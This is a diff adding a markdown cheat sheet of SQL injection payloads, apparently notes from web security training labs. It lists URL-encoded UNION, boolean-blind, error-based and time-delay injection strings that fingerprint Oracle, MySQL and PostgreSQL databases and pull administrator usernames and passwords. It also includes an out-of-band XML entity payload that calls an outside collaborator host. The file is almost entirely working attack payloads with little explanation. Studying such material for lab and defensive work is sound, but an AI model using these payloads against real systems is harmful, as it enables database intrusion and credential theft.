@@ -1,0 +1,69 @@
+# MANUAL SQLi
+
+# Basic SQLi
+'+OR+1=1--
+
+# SQL injection UNION attack, determining the number of columns returned by the query
+'+UNION+SELECT+NULL,NULL,NULL--
+
+# SQL injection UNION attack, finding a column containing text
+'+UNION+SELECT+NULL,'abc',NULL--
+
+# SQL injection UNION attack, retrieving data from other tables
+'+UNION+SELECT+username,+password+FROM+users--
+
+# SQL injection UNION attack, retrieving multiple values in a single column
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+# SQL injection attack, querying the database type and version on Oracle
+'+UNION+SELECT+'abc','def'+FROM+DUAL--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+# SQL injection attack, querying the database type and version on MySQL and Microsoft
+'+UNION+SELECT+'abc','def'#
+'+UNION+SELECT+@@version,+NULL#
+
+# SQL injection attack, listing the database contents on non-Oracle databases
+'+UNION+SELECT+'abc','def'--
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ntijte'--
+'+UNION+SELECT+username_vpansa,+password_idzqga+FROM+users_ntijte--
+
+# SQL injection attack, listing the database contents on Oracle
+'+UNION+SELECT+'abc','def'+FROM+DUAL--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_HGTIGE'--
+'+UNION+SELECT+USERNAME_NWXYFC,+PASSWORD_ZJANUR+FROM+USERS_HGTIGE--
+
+
+
+# BLIND SQLi
+
+# Blind SQL injection with conditional responses
+'+OR+1=1--
+'+OR+1=2--
+'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--
+'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>20--
+'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,20,1)='§a§'--
+
+# Blind SQL injection with conditional errors
+'
+''
+'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
+'+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
+'+UNION+SELECT+CASE+WHEN+(username='administrator')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)=20)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,20,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+
+# Blind SQL injection with time delays
+'||pg_sleep(10)--
+
+# Blind SQL injection with time delays and information retrieval
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,16,1)='§a§')+THEN+pg_sleep(15)+ELSE+pg_sleep(0)+END+FROM+users--
+
+# Blind SQL injection with out-of-band interaction
+'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
